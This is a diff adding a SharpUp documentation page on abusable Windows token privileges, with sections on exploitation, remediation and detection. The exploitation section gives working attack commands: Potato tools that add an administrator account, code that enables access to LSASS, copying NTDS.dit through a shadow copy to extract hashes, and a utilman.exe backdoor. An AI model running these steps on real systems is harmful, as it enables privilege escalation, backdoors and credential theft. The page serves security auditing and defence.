@@ -1,0 +1,380 @@
+---
+title: 'Token Privileges'
+description: 'Dangerous token privileges that can be abused'
+icon: 'id-card'
+---
+
+## Overview
+
+The Token Privileges check enumerates the privileges assigned to the current process token and identifies dangerous privileges that can be abused for privilege escalation. Even if these privileges are in a "disabled" state, they can often be enabled programmatically and exploited.
+
+<Info>
+Token privileges are powerful Windows security features that allow specific operations. When improperly assigned, they create serious privilege escalation opportunities.
+</Info>
+
+## How It Works
+
+SharpUp queries the current process token and checks for these dangerous privileges:
+
+**Dangerous Privileges:**
+- `SeSecurityPrivilege` - Manage auditing and security log
+- `SeTakeOwnershipPrivilege` - Take ownership of files/objects
+- `SeLoadDriverPrivilege` - Load and unload device drivers
+- `SeBackupPrivilege` - Backup files (bypass ACLs for read)
+- `SeRestorePrivilege` - Restore files (bypass ACLs for write)
+- `SeDebugPrivilege` - Debug programs (access any process memory)
+- `SeSystemEnvironmentPrivilege` - Modify firmware environment values
+- `SeImpersonatePrivilege` - Impersonate authenticated users
+- `SeTcbPrivilege` - Act as part of the operating system
+
+## Example Output
+
+```
+=== Abusable Token Privileges ===
+    SeImpersonatePrivilege: Enabled
+    SeDebugPrivilege: Enabled, Default
+    SeBackupPrivilege: Disabled
+```
+
+**Interpretation:**
+- SeImpersonatePrivilege is currently enabled - can be abused immediately
+- SeDebugPrivilege is enabled and is in the default set
+- SeBackupPrivilege is disabled but can be enabled programmatically
+
+## Exploitation
+
+### SeImpersonatePrivilege - Potato Exploits
+
+```powershell
+# Most common exploitation vector
+# Use Juicy Potato, Rotten Potato, or similar
+
+# Check if privilege exists
+whoami /priv | findstr SeImpersonate
+
+# Use JuicyPotato
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker P@ss /add" -t *
+
+# Or use RoguePotato
+RoguePotato.exe -r 10.10.10.10 -e "cmd.exe /c whoami" -l 9999
+```
+
+### SeDebugPrivilege - Process Injection
+
+```csharp
+// Enable SeDebugPrivilege and inject into LSASS
+using System;
+using System.Runtime.InteropServices;
+
+class DebugPrivilege {
+    [DllImport("advapi32.dll")]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport("advapi32.dll")]
+    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+
+    [DllImport("advapi32.dll")]
+    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+    public static void EnableDebugPrivilege() {
+        IntPtr hToken;
+        LUID luid;
+        TOKEN_PRIVILEGES tp;
+
+        OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x0028, out hToken);
+        LookupPrivilegeValue(null, "SeDebugPrivilege", out luid);
+
+        tp.PrivilegeCount = 1;
+        tp.Privileges = new LUID_AND_ATTRIBUTES[1];
+        tp.Privileges[0].Luid = luid;
+        tp.Privileges[0].Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED
+
+        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+
+        // Now can access any process including LSASS
+        // Use Mimikatz or custom code to dump credentials
+    }
+}
+```
+
+### SeBackupPrivilege - Copy Protected Files
+
+```powershell
+# Enable SeBackupPrivilege to read any file
+# Can read SAM/SYSTEM hives, NTDS.dit, etc.
+
+# Using diskshadow to copy NTDS.dit
+$script = @"
+set context persistent nowriters
+add volume c: alias someAlias
+create
+expose %someAlias% z:
+"@
+
+$script | diskshadow.exe
+
+# Copy NTDS.dit from shadow copy
+Copy-Item z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
+
+# Extract hashes offline
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+### SeRestorePrivilege - Modify Protected Files
+
+```powershell
+# Write to protected locations
+# Can replace system binaries, modify service executables
+
+# Example: Replace utilman.exe for backdoor
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant administrators:F
+copy cmd.exe C:\Windows\System32\utilman.exe
+
+# At login screen, press Win+U to get SYSTEM cmd
+```
+
+### SeLoadDriverPrivilege - Load Malicious Driver
+
+```cpp
+// Load malicious kernel driver
+// Can achieve SYSTEM from any user context
+
+#include <windows.h>
+
+BOOL LoadDriver(LPCWSTR driverPath) {
+    // Add driver to registry
+    // Use NtLoadDriver to load
+    // Driver executes in kernel mode with full privileges
+    return TRUE;
+}
+```
+
+### SeTakeOwnershipPrivilege - Take File Ownership
+
+```powershell
+# Take ownership of any file
+takeown /f C:\Windows\System32\config\SAM
+icacls C:\Windows\System32\config\SAM /grant administrators:F
+
+# Read SAM file
+# Extract local account hashes
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Review Token Privileges">
+    ```powershell
+    # Check current privileges
+    whoami /priv
+
+    # Check for specific dangerous privileges
+    whoami /priv | findstr "SeImpersonate\|SeDebug\|SeBackup\|SeRestore\|SeLoadDriver\|SeTakeOwnership"
+    ```
+  </Step>
+
+  <Step title="Remove Unnecessary Privileges">
+    Open Local Security Policy or Group Policy:
+
+    1. Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment
+    2. Remove users/groups from:
+       - Debug programs (SeDebugPrivilege)
+       - Impersonate a client after authentication (SeImpersonatePrivilege)
+       - Load and unload device drivers (SeLoadDriverPrivilege)
+       - Take ownership of files (SeTakeOwnershipPrivilege)
+       - Back up files and directories (SeBackupPrivilege)
+       - Restore files and directories (SeRestorePrivilege)
+  </Step>
+
+  <Step title="Use Managed Service Accounts">
+    ```powershell
+    # For service accounts, use gMSA instead of standard accounts
+    # gMSA automatically manages privileges
+
+    New-ADServiceAccount -Name svc_backup `
+        -DNSHostName svc_backup.contoso.com `
+        -PrincipalsAllowedToRetrieveManagedPassword "BackupServers$"
+
+    Install-ADServiceAccount -Identity svc_backup
+
+    # Configure service to use gMSA (no password needed)
+    ```
+  </Step>
+
+  <Step title="Minimize LocalSystem Services">
+    ```powershell
+    # Audit services running as SYSTEM
+    Get-WmiObject Win32_Service |
+    Where-Object {$_.StartName -eq "LocalSystem"} |
+    Select-Object Name, DisplayName, State, StartMode
+
+    # Change service accounts to least privilege
+    sc.exe config ServiceName obj= "NT AUTHORITY\Local Service"
+    ```
+  </Step>
+</Steps>
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Enable privilege use auditing
+auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
+
+# Monitor Event IDs:
+# 4672 - Special privileges assigned to new logon
+# 4673 - A privileged service was called
+# 4674 - An operation was attempted on a privileged object
+
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4672,4673,4674} |
+Where-Object {
+    $_.Message -match "SeDebug|SeImpersonate|SeBackup|SeRestore|SeLoadDriver|SeTakeOwnership"
+}
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="Privilege Usage Monitoring">
+    - Monitor Event ID 4672 for privilege assignments
+    - Alert on dangerous privileges assigned to non-admin users
+    - Track privilege elevation events
+    - Detect privilege abuse patterns
+  </Tab>
+
+  <Tab title="Process Monitoring">
+    - Monitor for Potato exploit tools (JuicyPotato, etc.)
+    - Detect suspicious process creations from service accounts
+    - Alert on unusual child processes from privileged parents
+    - Track LSASS access attempts
+  </Tab>
+
+  <Tab title="File System Monitoring">
+    - Monitor access to SAM/SYSTEM files
+    - Alert on NTDS.dit access
+    - Detect shadow copy creations
+    - Track utilman.exe modifications
+  </Tab>
+
+  <Tab title="Driver Loading">
+    - Monitor driver loading events (Event ID 4697)
+    - Alert on unsigned driver loads
+    - Detect malicious driver names
+    - Track kernel module loads
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: IIS Application Pool Identity">
+    **Context:** IIS application pool running with default identity (ApplicationPoolIdentity) has SeImpersonatePrivilege.
+
+    **Attack Path:**
+    1. Compromise web application (SQL injection, file upload, etc.)
+    2. Execute code in context of application pool
+    3. Use Juicy Potato to escalate to SYSTEM
+    4. Complete server compromise
+
+    **Prevention:**
+    - Use least privileged application pool identities
+    - Implement application whitelisting
+    - Network segmentation
+    - Monitor for Potato exploits
+  </Accordion>
+
+  <Accordion title="Scenario 2: SQL Server Service Account">
+    **Context:** SQL Server running as domain account with SeImpersonatePrivilege and SeDebugPrivilege.
+
+    **Impact:**
+    - xp_cmdshell execution leads to privilege escalation
+    - Can impersonate any authenticated user
+    - Can access any process memory (including LSASS)
+    - Domain credential theft possible
+
+    **Solution:**
+    - Use gMSA for SQL Server
+    - Disable xp_cmdshell
+    - Remove unnecessary privileges
+    - Implement least privilege
+  </Accordion>
+
+  <Accordion title="Scenario 3: Backup Operator Group Member">
+    **Context:** User is member of Backup Operators group, granting SeBackupPrivilege and SeRestorePrivilege.
+
+    **Attack Path:**
+    1. User with backup privileges logs on
+    2. Uses privileges to copy NTDS.dit and SYSTEM hive
+    3. Extracts all domain password hashes offline
+    4. Complete domain compromise
+
+    **Fix:**
+    - Strictly limit Backup Operators membership
+    - Monitor file access by backup operators
+    - Implement Just-In-Time access
+    - Use LAPS for privilege escalation auditing
+  </Accordion>
+</AccordionGroup>
+
+## Prevention Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Principle of Least Privilege" icon="user-shield">
+    Only assign necessary privileges. Most accounts don't need any special privileges.
+  </Card>
+  <Card title="Use Managed Service Accounts" icon="robot">
+    gMSA and sMSA automatically manage privileges appropriately.
+  </Card>
+  <Card title="Avoid LocalSystem" icon="ban">
+    Run services with minimal required accounts, not LocalSystem.
+  </Card>
+  <Card title="Regular Audits" icon="magnifying-glass">
+    Periodically review which accounts have dangerous privileges.
+  </Card>
+</CardGroup>
+
+## Common Privilege Abuse Tools
+
+<Warning>
+Be aware of these tools commonly used to exploit token privileges:
+</Warning>
+
+- **Juicy Potato** - SeImpersonatePrivilege exploitation (Windows Server 2016 and earlier)
+- **Rogue Potato** - SeImpersonatePrivilege exploitation (Windows Server 2019+)
+- **PrintSpoofer** - SeImpersonatePrivilege exploitation via Print Spooler
+- **Mimikatz** - Uses SeDebugPrivilege to dump credentials from LSASS
+- **Process Hacker** - Uses SeDebugPrivilege for process manipulation
+- **Capcom.sys** - Vulnerable driver loaded via SeLoadDriverPrivilege
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Modifiable Services" icon="gear" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservices">
+    Services that can be reconfigured
+  </Card>
+  <Card title="Registry AutoLogons" icon="key" href="/ghostpack-docs/SharpUp-mdx/checks/registryautologons">
+    Plaintext credentials in registry
+  </Card>
+  <Card title="AlwaysInstallElevated" icon="box" href="/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated">
+    MSI installation with elevated privileges
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Microsoft Docs" icon="book" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">
+    Windows Privilege Constants
+  </Card>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1134/">
+    T1134 - Access Token Manipulation
+  </Card>
+  <Card title="Potato Exploits" icon="book" href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">
+    Windows Privilege Escalation via Potato Exploits
+  </Card>
+</CardGroup>
